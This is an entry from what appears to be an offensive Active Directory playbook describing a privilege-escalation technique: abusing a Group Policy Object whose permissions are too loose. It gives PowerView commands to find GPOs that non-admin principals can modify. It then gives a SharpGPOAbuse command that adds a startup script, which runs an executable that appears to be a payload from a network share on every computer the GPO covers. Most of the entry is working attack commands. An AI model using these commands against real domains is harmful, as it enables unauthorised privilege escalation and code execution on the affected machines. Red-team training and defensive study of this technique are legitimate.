title: Modifying an existing GPO
category: 
  - AD:
    - ACL:
      - GPO  
tactic: Privilege Escalation
tags: []
description:
  - title: 
    content: Modifying an existing GPO that is already applied to one or more OUs is the most 
      straightforward scenario. To search for these, we need to enumerate all GPOs in the domain with Get-DomainGPO 
      and check the ACL of each one with Get-DomainObjectAcl. We want to filter any for which a principal has 
      modify privileges such as CreateChild, WriteProperty or GenericWrite, and also want to filter out the 
      legitimate principals including SYSTEM, Domain Admins and Enterprise Admins.

steps:
  - description: Enumerate
    options: 
      - tool: Powerview.ps1
        usage: |
          Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
          Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
          ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}
      
  - description: Resolve the GPO name and the SID of the principal.
    options: 
      - tool: Powerview.ps1
        usage: Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
  
  - description: Modify the GPO
    options: 
      - tool: SharpGPOAbuse.exe
        usage: |
          SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"
  
comments:
  